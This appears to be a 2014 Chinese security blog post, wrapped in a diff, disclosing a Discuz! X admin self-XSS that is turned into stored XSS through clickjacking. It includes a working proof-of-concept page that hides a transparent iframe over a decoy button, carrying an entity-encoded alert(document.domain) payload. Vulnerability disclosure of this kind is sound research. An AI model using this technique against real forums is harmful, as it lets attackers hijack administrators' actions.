@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Discuz! X 某XSS | Chu&#39;s BLoG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Self XSS + Click Jacking ==&amp;gt; 存储型 XSS
+/admin.php?frames=yes&amp;amp;action=moderate&amp;amp;operation=threads，页面内有个隐藏表单 “title”，可以GET 提交，管理点击『提交』后触发。由于是一个 Self XSS，不好利用，而 Discuz 后台是可以通过 iframe 标签引用的，导致我们可以结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Discuz! X 某XSS">
+<meta property="og:url" content="http://sh3ll.me/2014/04/20/discuz-clickjack-to-xss/index.html">
+<meta property="og:site_name" content="Chu's BLoG">
+<meta property="og:description" content="Self XSS + Click Jacking ==&amp;gt; 存储型 XSS
+/admin.php?frames=yes&amp;amp;action=moderate&amp;amp;operation=threads，页面内有个隐藏表单 “title”，可以GET 提交，管理点击『提交』后触发。由于是一个 Self XSS，不好利用，而 Discuz 后台是可以通过 iframe 标签引用的，导致我们可以结">
+<meta property="og:image" content="http://sh3ll.me/images/2014/04/20/discuz-clickjack-to-xss.gif">
+<meta property="og:updated_time" content="2016-07-16T09:12:50.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Discuz! X 某XSS">
+<meta name="twitter:description" content="Self XSS + Click Jacking ==&amp;gt; 存储型 XSS
+/admin.php?frames=yes&amp;amp;action=moderate&amp;amp;operation=threads，页面内有个隐藏表单 “title”，可以GET 提交，管理点击『提交』后触发。由于是一个 Self XSS，不好利用，而 Discuz 后台是可以通过 iframe 标签引用的，导致我们可以结">
+<meta name="twitter:image" content="http://sh3ll.me/images/2014/04/20/discuz-clickjack-to-xss.gif">
+  
+    <link rel="alternative" href="/atom.xml" title="Chu&#39;s BLoG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Chu&#39;s BLoG</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Talk is cheap, show me the shell.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-home-icon" class="nav-icon" href="/"></a>
+        
+          <a id="nav-archives-icon" class="nav-icon" href="/archives"></a>
+        
+          <a id="nav-about-icon" class="nav-icon" href="/about"></a>
+        
+          <a id="nav-links-icon" class="nav-icon" href="/links"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-discuz-clickjack-to-xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Discuz! X 某XSS
+    </h1>
+  
+
+      </header>
+    
+    <time class="article-date" datetime="2014-04-20T15:05:18.000Z" itemprop="datePublished">04-20-2014</time>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pentest/">Pentest</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Self XSS + Click Jacking ==&gt; 存储型 XSS</p>
+<p>/admin.php?frames=yes&amp;action=moderate&amp;operation=threads，页面内有个隐藏表单 “title”，可以GET 提交，管理点击『提交』后触发。<br>由于是一个 Self XSS，不好利用，而 Discuz 后台是可以通过 iframe 标签引用的，导致我们可以结合 Click Jacking（点击劫持）加以利用。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;title&gt;Dz XSS Demo&lt;/title&gt;</div><div class="line">    &lt;style type=&quot;text/css&quot;&gt;</div><div class="line">    #click&#123;</div><div class="line">        height: 25px;</div><div class="line">        width: 60px;</div><div class="line">        top: 710px;</div><div class="line">        left: 220px;</div><div class="line">        position: absolute;</div><div class="line">        z-index: 1;</div><div class="line">    &#125;</div><div class="line">    #hidden&#123;</div><div class="line">        height: 500px;</div><div class="line">        width: 500px;</div><div class="line">        top: 320px;</div><div class="line">        left: 45px;</div><div class="line">        filter: alpha(opacity=0);</div><div class="line">        opacity: 0;</div><div class="line">        position: absolute;</div><div class="line">        z-index: 2</div><div class="line">    &#125;</div><div class="line">    &lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;img src=&quot;girl.jpg&quot;&gt;</div><div class="line">    &lt;button id=&quot;click&quot;&gt;下一页&lt;/button&gt;</div><div class="line">    &lt;iframe id=&quot;hidden&quot; src=&quot;http://www.test.com/dz3/admin.php?frames=yes&amp;action=moderate&amp;operation=threads&amp;title=%26%23x27%26%23x29%26%23x22%26%23x29%26%23x3b%26%23x61%26%23x6c%26%23x65%26%23x72%26%23x74%26%23x28%26%23x64%26%23x6f%26%23x63%26%23x75%26%23x6d%26%23x65%26%23x6e%26%23x74%26%23x2e%26%23x64%26%23x6f%26%23x6d%26%23x61%26%23x69%26%23x6e%26%23x29%26%23x3b%26%23x2f%26%23x2f&quot;&gt;&lt;/iframe&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/images/2014/04/20/discuz-clickjack-to-xss.gif" alt="效果演示"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="http://sh3ll.me/2014/04/20/discuz-clickjack-to-xss/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2014/04/28/web-for-pentester/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Web For Pentester 笔记
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2014/04/13/sublime-short-keys/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Sublime Text 有用的快捷键</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Chu<br>
+      <a href="https://github.com/steven5538/hexo-theme-athena" target="_blank">Athena</a> by <a href="http://steven5538.tw" target="_blank">Steven5538</a> | Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | <script src="http://s11.cnzz.com/z_stat.php?id=1254610758&web_id=1254610758" language="JavaScript"></script>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+<script>
+  var disqus_shortname = 'sh3ll';
+  
+  var disqus_url = 'http://sh3ll.me/2014/04/20/discuz-clickjack-to-xss/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
